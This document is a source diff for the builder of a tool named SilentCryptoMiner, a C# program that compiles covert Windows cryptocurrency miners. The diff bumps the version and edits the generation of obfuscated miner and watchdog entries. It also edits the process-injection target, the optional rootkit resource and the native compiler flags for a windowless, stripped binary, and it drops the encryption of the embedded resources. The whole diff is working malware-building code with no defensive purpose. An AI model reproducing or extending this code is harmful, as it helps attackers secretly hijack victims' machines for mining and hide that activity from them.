@@ -43,7 +43,7 @@ namespace SilentCryptoMiner
         public string UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU";
         public string UNAMIV = "UUCommandULineUU";
 
-        public string builderVersion = "3.0.2";
+        public string builderVersion = "3.1.0";
 
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -206,8 +206,8 @@ namespace SilentCryptoMiner
                     argstr.Append($" --cinit-id=\"{minerid}\"");
 
                     string injectionTarget = Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
-                    minerSet.Add(string.Format("{{ AYW_OBFUSCATE(L\"{0}\"), AYW_OBFUSCATE(L\"{1}\"), AYW_OBFUSCATE(L\"{2}\") }}", xmr ? "xmr" : "eth", @$"Global\\{minerid}", @$"\\{(FormAO.toggleRootkit.Checked ? "dialer.exe" : injectionTarget)} {minerid} {Unamlib_Encrypt(argstr.ToString())}"));
-                    watchdogSet.Add(string.Format("{{ AYW_OBFUSCATE(L\"{0}\"), AYW_OBFUSCATE(L\"{1}\") }}", xmr ? "xmr" : "eth", @$"Global\\{minerid}"));
+                    minerSet.Add(string.Format("{{ AYW_OBFUSCATE(L\"{0}\"), AYW_OBFUSCATE(L\"{1}\"), AYW_OBFUSCATE(L\"{2}\"), AYW_OBFUSCATE(L\"{3}\") }}", xmr ? "xmr" : "eth", $@"\\BaseNamedObjects\\{minerid}", $@"\\{(FormAO.toggleRootkit.Checked ? "dialer.exe" : injectionTarget)}", $" {minerid} {Unamlib_Encrypt(argstr.ToString())}"));
+                    watchdogSet.Add(string.Format("{{ AYW_OBFUSCATE(L\"{0}\"), AYW_OBFUSCATE(L\"{1}\") }}", xmr ? "xmr" : "eth", $@"\\BaseNamedObjects\\{minerid}"));
                     findSet.Add(minerid);
                 }
 
@@ -216,7 +216,7 @@ namespace SilentCryptoMiner
 
                 string compilerPath = Path.Combine(Path.GetDirectoryName(savePath), "UCompilers");
                 string versionPath = Path.Combine(compilerPath, "version.txt");
-                if (Directory.Exists(compilerPath) && (!File.Exists(versionPath) || File.ReadAllText(versionPath) != "1")){
+                if (Directory.Exists(compilerPath) && (!File.Exists(versionPath) || File.ReadAllText(versionPath) != "2")){
                     Directory.Delete(compilerPath, true);
                 }
 
@@ -253,7 +253,7 @@ namespace SilentCryptoMiner
                     BuildLog("Compiling Watchdog...");
                     string watchdogpath = savePathBase + "-watchdog.exe";
                     string watchdogcode = Properties.Resources.watchdog.Replace("$WATCHDOGSET", string.Join(",", watchdogSet)).Replace("$MINERCOUNT", watchdogSet.Count.ToString());
-                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(watchdogpath)}.cpp\" UFiles\\*.cpp UFiles\\Syscalls\\syscalls.c UFiles\\Syscalls\\syscallsstubs.std.x64.s -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -O3 -s -o \"{Path.GetFileNameWithoutExtension(watchdogpath)}.exe\"", "", false, toggleAdministrator.Checked))
+                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(watchdogpath)}.cpp\" UFiles\\*.cpp UFiles\\Syscalls\\*.c UFiles\\Syscalls\\syscallsstubs.std.x64.s -O3 -static-libgcc -static-libstdc++ -s -o \"{Path.GetFileNameWithoutExtension(watchdogpath)}.exe\"", "", false, toggleAdministrator.Checked))
                     {
                         watchdogdata = File.ReadAllBytes(watchdogpath);
                         File.Delete(watchdogpath);
@@ -268,29 +268,30 @@ namespace SilentCryptoMiner
 
                 BuildLog("Converting resources...");
                 StringBuilder resources = new StringBuilder();
-                Codedom.CreateResource(resources, "resXMR", mineXMR ? Codedom.Cipher(Properties.Resources.xmrig, CipherKey) : new byte[] {});
-                Codedom.CreateResource(resources, "resETH", mineETH ? Codedom.Cipher(Properties.Resources.ethminer, CipherKey) : new byte[] { });
+                Codedom.CreateResource(resources, "resXMR", mineXMR ? Properties.Resources.xmrig : new byte[] {});
+                Codedom.CreateResource(resources, "resETH", mineETH ? Properties.Resources.ethminer : new byte[] { });
                 if (mineXMR) {
-                    Codedom.CreateResource(resources, "resWR64", Codedom.Cipher(Properties.Resources.WinRing0x64, CipherKey));
+                    Codedom.CreateResource(resources, "resWR64", Properties.Resources.WinRing0x64);
                 }
                 if (chkStartup.Checked && toggleWatchdog.Checked)
                 {
-                    Codedom.CreateResource(resources, "resWatchdog", Codedom.Cipher(watchdogdata, CipherKey));
+                    Codedom.CreateResource(resources, "resWatchdog", watchdogdata);
                 }
                 if (xmrGPU)
                 {
-                    Codedom.CreateResource(resources, "resddb64", Codedom.Cipher(Properties.Resources.ddb64, CipherKey));
-                    Codedom.CreateResource(resources, "resnvrtc", Codedom.Cipher(Properties.Resources.nvrtc64_112_0, CipherKey));
-                    Codedom.CreateResource(resources, "resnvrtc2", Codedom.Cipher(Properties.Resources.nvrtc_builtins64_112, CipherKey));
+                    MessageBox.Show("XMR \"GPU Mining\" is enabled which requries a large amount of RAM to compile, if you get an error when compiling the miner then you can try increasing your Windows pagefile size which should allow you to compile it without issue.", "High amount of RAM required.", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    Codedom.CreateResource(resources, "resddb64", Properties.Resources.ddb64);
+                    Codedom.CreateResource(resources, "resnvrtc", Properties.Resources.nvrtc64_112_0);
+                    Codedom.CreateResource(resources, "resnvrtc2", Properties.Resources.nvrtc_builtins64_112);
                 }
                 if (FormAO.toggleRootkit.Checked)
                 {
-                    Codedom.CreateResource(resources, "resRootkit", Codedom.Cipher(Properties.Resources.rootkit_i, CipherKey));
+                    Codedom.CreateResource(resources, "resRootkit", Properties.Resources.rootkit_i);
                 }
                 minerbuilder.Replace("$RESOURCES", resources.ToString());
 
                 BuildLog("Compiling Miner...");
-                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(savePathBase)}.cpp\" UFiles\\*.cpp UFiles\\Injection\\*.cpp UFiles\\Syscalls\\syscalls.c UFiles\\Syscalls\\syscallsstubs.std.x64.s resource.o -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -O3 -s -o \"{Path.GetFileNameWithoutExtension(savePathBase) + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
+                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(savePathBase)}.cpp\" UFiles\\*.cpp UFiles\\Injection\\*.cpp UFiles\\Syscalls\\*.c UFiles\\Syscalls\\syscallsstubs.std.x64.s resource.o -O3 -static-libgcc -static-libstdc++ -s -o \"{Path.GetFileNameWithoutExtension(savePathBase) + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
                 {
                     BuildLog("Compiling Uninstaller...");
                     Codedom.UninstallerCompiler(savePathBase + "-uninstaller.exe");
